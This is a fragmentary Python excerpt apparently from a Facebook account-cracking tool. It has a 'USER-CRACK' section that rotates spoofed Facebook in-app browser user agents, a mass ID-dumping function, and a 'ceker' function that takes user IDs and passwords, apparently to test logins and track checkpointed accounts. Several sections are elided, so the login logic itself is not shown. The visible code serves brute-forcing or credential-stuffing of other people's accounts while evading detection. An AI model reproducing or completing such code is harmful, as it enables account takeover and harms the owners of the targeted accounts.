...
#----------[ USER-CRACK ]----------#  	
for x in range(1000):
    a=random.choice(["9","5","4","6","8","7","10","11","12","13","14"])
    ua1 = ("Mozilla/5.0 (Linux; Android 9; Nokia C1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/459.1.0.42.84;]")
    ua2 = ("Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/464.0.0.60.90;]")
    ua3 = ("Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.53 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/407.0.0.12.116;]")
    ua4 = ("Mozilla/5.0 (Linux; Android 9; Nokia C1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.164 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/404.0.0.12.118;]")
    uaaa = random.choice([ua1,ua2,ua3,ua4])
    ugen.append(uaaa)
def uaku():
	try:
...
def dump_massal():    
 ...
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15"
        })
        if len(id) == 0:
            params = (
            {
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 9; Samsung Chromebook 3 Build/R103-14816.131.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/368.0.0.24.108;]'
